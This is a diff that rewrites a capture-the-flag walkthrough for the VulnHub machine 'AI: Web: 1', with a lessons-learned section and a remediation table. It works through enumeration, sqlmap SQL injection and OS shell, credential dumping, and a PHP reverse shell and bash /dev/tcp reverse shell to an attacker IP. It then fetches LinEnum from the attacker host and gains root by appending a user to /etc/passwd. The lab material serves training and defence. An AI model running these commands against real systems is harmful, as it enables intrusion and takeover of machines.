@@ -1,167 +1,223 @@
 # AI: Web: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.13.131 (adjust for your network) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.13.131 |
+| **Attacker IP** | 192.168.13.132 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ai-web-1,353/) |
+| **Goal** | root flag (`flag.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ai-web-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → Apache port 80 → dirb finds hidden paths → Burp captures SQLi in User ID form → sqlmap --os-shell → reverse shell as www-data → writable /etc/passwd → add root user → flag.txt
+AI: Web: 1 presents a single HTTP service. The `robots.txt` file reveals hidden directories, and a User ID submission form is vulnerable to SQL injection. sqlmap is used to dump credentials from the database and gain an OS shell. The OS shell exposes a world-writable `/etc/passwd`, which is modified to add a root-level user for privilege escalation.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Web directory enumeration (dirb)
-3. SQL injection discovery and exploitation (sqlmap)
-4. OS shell via sqlmap → PHP reverse shell
-5. Privilege escalation via writable /etc/passwd
+1. Host discovery and port scan
+2. Web enumeration via `robots.txt` and directory browsing
+3. SQL injection discovery and exploitation with sqlmap
+4. OS shell via sqlmap `--os-shell`
+5. PHP reverse shell upload and catch
+6. Privilege escalation via writable `/etc/passwd`
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scan
 
 ```bash
-netdiscover
+netdiscover -r 192.168.13.0/24
 nmap -A 192.168.13.131
 ```
 
-Only port 80 (Apache) is open.
+**Open ports:**
 
-![Nmap scan](images/01-nmap.png)
+| Port | Service |
+|---|---|
+| 80 | HTTP (Apache) |
+
+The nmap output reveals `robots.txt` and discloses paths: `/m3diNf0/` and `/se3reTdir777/uploads/`.
+
+![nmap scan](images/01-nmap.png)
 
 ---
 
 ## Step 2: Web Enumeration
 
+Browse to `http://192.168.13.131` — the index displays a taunting message.
+
+Navigate to `/m3diNf0/`:
+
 ```bash
 dirb http://192.168.13.131/m3diNf0/
 ```
 
-Finds `info.php` — reveals the document root:
+Directory brute-force finds `info.php`, which discloses the full server path:
 
 ```
-/home/www/html/web1x443290o2sdf92213
+Document Root: /home/www/html/web1x443290o2sdf92213
 ```
 
-![dirb results](images/02-dirb.png)
-
-Browse to `http://192.168.13.131/se3reTdir777/` — a User ID lookup form.
+Navigate to `/se3reTdir777/` — a User ID form is present.
 
 ---
 
-## Step 3: SQL Injection with sqlmap
+## Step 3: SQL Injection Discovery
 
-Intercept the form submission in Burp Suite, save the request to `req.txt`.
-
-List databases:
-
-```bash
-sqlmap -r req.txt --dbs --batch
+Entering `1` into the form returns:
+```
+First name: admin
+Last name: admin
 ```
 
-Dump the target database:
+Entering `1'` or `1 OR 1=1` causes an error — the input is not sanitized.
+
+Capture the request with Burp Suite and save it as `req.txt`.
+
+![SQL injection form](images/02-sqli.png)
+
+---
+
+## Step 4: Database Dump with sqlmap
 
 ```bash
+# Identify databases
+sqlmap -r req.txt -D aiweb1 --dbs --batch
+
+# Dump all tables and data
 sqlmap -r req.txt -D aiweb1 --dump-all --batch
 ```
 
-Extracted credentials:
+Recovered credentials:
 
-| Username | Password |
-|---|---|
-| t00r | FakeUserPassw0rd |
-| aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa |
-| u3er | N0tThisOneAls0 |
+| ID | Username | Password |
+|---|---|---|
+| 1 | t00r | FakeUserPassw0rd |
+| 2 | aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa |
+| 3 | u3er | N0tThisOneAls0 |
+
+sqlmap also identifies a file upload endpoint at `/se3reTdir777/uploads/`.
 
 ![sqlmap dump](images/03-sqlmap.png)
 
 ---
 
-## Step 4: OS Shell via sqlmap
-
-Use the known document root to get an OS shell:
+## Step 5: OS Shell via sqlmap
 
 ```bash
-sqlmap -r req.txt --os-shell
-# When prompted for web root: /home/www/html/web1x443290o2sdf92213
+sqlmap -r req.txt -D aiweb1 --os-shell
 ```
 
-![sqlmap os-shell](images/04-os-shell.png)
+When prompted:
+- Web application language: **PHP**
+- Confirm full path disclosure: **yes**
+- Writable path: `/home/www/html/web1x443290o2sdf92213`
 
-From the OS shell, start a stable reverse shell. On attacker:
+An interactive OS shell is returned.
+
+```bash
+# Verify access
+id
+cat /etc/passwd
+```
+
+---
+
+## Step 6: PHP Reverse Shell Upload
+
+Edit `/usr/share/webshells/php/php-reverse-shell.php`:
+
+```php
+$ip = '192.168.13.132';
+$port = 1234;
+```
+
+Upload the shell via the discovered upload endpoint at `http://192.168.13.131/se3reTdir777/uploads/tmputvpz.php`.
+
+Start a listener:
 
 ```bash
 nc -lvp 1234
 ```
 
-On target via os-shell:
+Browse to the uploaded shell:
 
-```bash
-bash -c 'bash -i >& /dev/tcp/192.168.13.132/1234 0>&1'
+```
+http://192.168.13.131/se3reTdir777/uploads/php-reverse-shell.php
 ```
 
-Stabilize:
+A shell is received as `www-data`.
 
 ```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+![Reverse shell](images/04-shell.png)
 
 ---
 
-## Step 5: Privilege Escalation (Writable /etc/passwd)
+## Step 7: Privilege Escalation — Writable /etc/passwd
 
-Run LinEnum for quick enumeration:
+Run LinEnum to enumerate misconfigurations:
 
 ```bash
+# On attacker
+python3 -m http.server 8000
+
+# On target
 cd /tmp
 wget http://192.168.13.132:8000/LinEnum.sh
 chmod +x LinEnum.sh
-./LinEnum.sh | grep -i writable
+./LinEnum.sh
 ```
 
-`/etc/passwd` is world-writable.
+LinEnum reports that `/etc/passwd` is world-writable.
 
-Generate a password hash:
+Generate a password hash for a new root user:
 
 ```bash
 openssl passwd -1 -salt user3 pass123
-# $1$user3$rAGRVf5p2jYTqtqOW5cPu/
+# Output: $1$user3$rAGRVf5p2jYTqtqOW5cPu/
 ```
 
-Append a root-level user:
+Append the new root user:
 
 ```bash
 echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd
-su raj
-# Password: pass123
 ```
+
+Switch to the new user:
 
 ```bash
+su raj
+# Password: pass123
+
 id
-# uid=0(root) gid=0(root) groups=0(root)
-cat /root/flag.txt
+# uid=0(root) gid=0(root)
+
+cd /root
+cat flag.txt
 ```
 
-![Root flag](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **dirb/gobuster** against all discovered sub-paths often reveals hidden admin interfaces
-2. **sqlmap --os-shell** can turn SQLi directly into RCE when the web root is known
-3. **Writable /etc/passwd** is a critical misconfiguration that allows trivial root access
-4. **info.php** exposure leaks server internals (document root, PHP config) to attackers
+- `robots.txt` should not expose sensitive directory paths — it is publicly readable and acts as a roadmap for attackers.
+- SQL injection in a User ID parameter with no sanitization allows complete database extraction and OS-level command execution via sqlmap.
+- World-writable `/etc/passwd` is a critical misconfiguration that allows any user to add a root-privileged account.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| SQL injection in User ID form | Use parameterized queries (PDO/prepared statements) |
-| Exposed info.php | Remove or restrict access to phpinfo() pages |
-| sqlmap --os-shell access | Disable FILE privilege for DB user; restrict outbound from DB host |
-| Writable /etc/passwd | `chmod 644 /etc/passwd` (owner root, read-only for others) |
+| SQL injection in User ID form | Use parameterized queries or prepared statements; sanitize all input |
+| `robots.txt` path disclosure | Remove sensitive paths from `robots.txt`; restrict access at the web server level |
+| OS shell via sqlmap | Restrict database user privileges; disable `FILE` privilege in MySQL |
+| World-writable `/etc/passwd` | Set correct permissions: `chmod 644 /etc/passwd` |
+| File upload endpoint | Validate file type, size, and content; store uploads outside the web root |
